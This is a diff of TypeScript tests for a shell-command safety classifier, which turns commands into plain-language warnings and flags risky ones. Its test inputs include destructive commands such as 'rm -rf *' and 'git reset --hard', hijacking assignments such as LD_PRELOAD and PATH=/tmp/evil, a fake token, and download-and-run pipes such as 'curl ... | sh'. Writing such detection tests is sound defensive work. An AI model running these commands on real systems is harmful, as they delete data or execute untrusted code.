@@ -534,6 +534,41 @@ describe("the card's words from the classifier (review #214)", () => {
     // A path with dots in it is said as written.
     expect(says("rm -r ./build")).toContain("Deletes ./build and everything in it.");
     expect(says("rm -r ../build")).toContain("Deletes ../build and everything in it.");
+    // A folder's contents copied in (`/tmp/x/.`) are files of the same names, not the folder itself.
+    expect(says("cp -r /tmp/x/. .")).toEqual(["Replaces files in the current folder if they exist."]);
+    // After a cd in the same command, "the current folder" isn't the one the card says it starts in: it is named.
+    expect(says("cd ~/Documents && git checkout .")).toEqual(["Throws away changes to /home/ana/Documents."]);
+    expect(says("cd ~/Documents && cp -r /tmp/x/* .")).toEqual(["Replaces files in /home/ana/Documents if they exist."]);
+    expect(says("cd /tmp/x && find .. -name '*.log' -delete")).toEqual(["Deletes what it finds under /tmp."]);
+    // Where it is still the folder the card starts in, or the one above it, it says so.
+    expect(says("cd sub && find .. -name '*.log' -delete")).toEqual(["Deletes what it finds under the current folder."]);
+    expect(says("cd ~ && git checkout .")).toEqual(["Throws away changes to the folder above the current one."]);
+  });
+
+  it("says what removing packages, crontab -r, a reset to another commit and rm * really do (commands-remote-r1)", () => {
+    for (const cmd of [
+      "npm uninstall lodash", "npm rm lodash", "npm r lodash", "yarn remove lodash", "pnpm remove lodash", "bun remove lodash",
+      "pip uninstall -y requests", "pip3 uninstall requests", "pipx uninstall black", "poetry remove requests", "pipenv uninstall requests",
+      "conda remove numpy", "uv remove requests", "uv pip uninstall requests", "gem uninstall rails", "cargo uninstall ripgrep",
+      "composer remove monolog/monolog", "dotnet remove package Newtonsoft.Json", "dotnet tool uninstall dotnet-ef",
+    ]) expect(says(cmd), cmd).toEqual(["Removes packages."]);
+    for (const cmd of ["npm install lodash", "pip install requests", "poetry add requests", "uv pip install requests", "npm install remove"]) {
+      expect(says(cmd), cmd).toEqual(["Installs packages (they can run their own setup code)."]);
+    }
+    expect(says("crontab -r")).toEqual(["Deletes your scheduled jobs."]);
+    expect(says("crontab -ir")).toEqual(["Deletes your scheduled jobs."]);
+    expect(says("atrm 3")).toEqual(["Removes a scheduled job."]);
+    expect(says("atrm 3 4")).toEqual(["Removes scheduled jobs."]);
+    expect(says("crontab jobs.txt")).toEqual(["Schedules something to run later or at login."]);
+    expect(says("git reset --hard origin/main")).toEqual(["Moves the branch to origin/main, throwing away changes that aren't committed and any commits not in origin/main."]);
+    expect(says("git reset --hard HEAD~1")).toEqual(["Moves the branch to HEAD~1, throwing away changes that aren't committed and any commits not in HEAD~1."]);
+    for (const cmd of ["git reset --hard", "git reset --hard HEAD", "git reset --hard @"]) expect(says(cmd), cmd).toEqual(["Throws away changes that aren't committed."]);
+    expect(says("rm -rf *")).toEqual(["Deletes everything in the current folder."]);
+    expect(says("rm -rf ./*")).toEqual(["Deletes everything in the current folder."]);
+    expect(says("rm -rf build/*")).toEqual(["Deletes everything in build."]);
+    expect(says("rm *")).toEqual(["Deletes the files in the current folder."]);
+    expect(says("rm *.log")).toEqual(["Deletes *.log."]);
+    for (const cmd of ["rm -rf *", "rm *", "rm -rf build/*"]) for (const l of says(cmd)) expect(l, cmd).not.toContain("*");
   });
 
   it("says what Ember can't tell in plain words", () => {
@@ -571,6 +606,62 @@ describe("loops and ifs (commands-remote-2)", () => {
   it("reads a for loop's variable as an assignment: one that changes how commands are found or run is unclear", () => {
     expect(rules("for i in 1 2; do echo $i; done")).not.toContain("unclear.assignment");
     for (const risky of ["for PATH in /tmp/x; do ls; done", "for LD_PRELOAD in /tmp/x.so; do ls; done", "for GIT_SSH_COMMAND in x; do git fetch; done", "for $v in a; do ls; done"]) {
+      expect(rules(risky), risky).toContain("unclear.assignment");
+    }
+  });
+
+  it("reads an assignment after then, do, else, an if, a while, ! or time as one, never as the program (commands-remote-c1-1)", () => {
+    const programs = (cmd: string) => classifyCommand(cmd, "bash", contextOf("linux")).commands.map(c => c.program);
+    for (const risky of [
+      "if true; then LD_PRELOAD=./x.so ls; fi",
+      "for i in 1; do PATH=/tmp/evil:/usr/bin; done; git status",
+      "until false; do LD_PRELOAD=./x.so ls; break; done",
+      "if true; then :; else LD_PRELOAD=./x.so ls; fi",
+      "if LD_PRELOAD=./x.so ls; then :; fi",
+      "while LD_PRELOAD=./x.so false; do :; done",
+      "if true; then LD_LIBRARY_PATH=/tmp ls; fi",
+      "if true; then HOME=/tmp; fi; ls",
+      "if true; then IFS=/; fi; ls",
+      "time LD_PRELOAD=./x.so ls",
+      "time -p PATH=/tmp/evil ls",
+      "if true; then time LD_PRELOAD=./x.so ls; fi",
+      "if ! LD_PRELOAD=./x.so ls; then :; fi",
+    ]) expect(rules(risky), risky).toContain("unclear.assignment");
+    expect(programs("if true; then LD_PRELOAD=./x.so ls; fi")).toEqual(["true", "ls", "fi"]);
+    expect(programs("time X=1 Y=2 make")).toEqual(["make"]);
+    // What an assignment holds is still checked: a token in it, a download run in its value.
+    expect(rules("if true; then GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789 ls; fi")).toContain("secret.token-arg");
+    expect(rules("if true; then X=$(curl -s https://example.com/x | sh) ls; fi")).toContain("escape.download-run");
+    // An ordinary variable is an ordinary assignment, and a program that runs the next word (command, nice) gets a program.
+    expect(rules("if true; then X=1 ls; fi")).not.toContain("unclear.assignment");
+    expect(programs("command X=1 ls")).toEqual(["X=1"]);
+  });
+
+  it("remembers a download made inside an if, a loop or time, so running it later asks (commands-remote-c1-1)", () => {
+    const got = (cmd: string) => classifyCommand(cmd, "bash", contextOf("linux"));
+    for (const cmd of [
+      "if true; then curl -s https://example.com/x > x.py; fi",
+      "for i in 1; do wget -qO- https://example.com/x > x.py; done",
+      "time curl -s https://example.com/x > x.py",
+      "if true; then curl -s https://example.com/x | tee x.py; fi",
+    ]) expect(got(cmd).downloads, cmd).toContain("/home/ana/proj/x.py");
+    expect(classifyCommand("python3 x.py", "bash", contextOf("linux", ["/home/ana/proj/x.py"])).findings.map(f => f.rule)).toContain("escape.run-downloaded");
+    // Piped straight into a shell, it is a download run, as without the if.
+    expect(got("if true; then curl -s https://example.com/x | sh; fi").findings.map(f => f.rule)).toContain("escape.download-run");
+    // A Windows program after then, in WSL, is checked as one that stands first: Windows would get other arguments.
+    const wsl = (cmd: string) => classifyCommand(cmd, "bash", contextOf("wsl")).findings.map(f => f.rule);
+    expect(wsl("notepad.exe 'a\"b'")).toContain("unclear.interop-args");
+    expect(wsl("if true; then notepad.exe 'a\"b'; fi")).toContain("unclear.interop-args");
+  });
+
+  it("reads IFS in front of read as only how that read splits, so the usual line loop is no assignment (commands-remote-2)", () => {
+    for (const fine of ["IFS= read -r l < list.txt", "while IFS= read -r l; do echo \"$l\"; done < list.txt", "IFS=: read -r a b <<< \"x:y\"", "time IFS= read -r l < list.txt"]) {
+      expect(rules(fine), fine).not.toContain("unclear.assignment");
+      expect(rules(fine), fine).not.toContain("unclear.interactive");
+      expect(rules(fine), fine).not.toContain("unclear.hidden-command");
+    }
+    // IFS anywhere else changes how every later command's words split; a read by path is a program of its own.
+    for (const risky of ["IFS=/ ls", "IFS=/; ls", "if true; then IFS=/; fi; ls", "IFS= ./read -r l < list.txt", "PATH=/tmp/x read -r l < list.txt"]) {
       expect(rules(risky), risky).toContain("unclear.assignment");
     }
   });
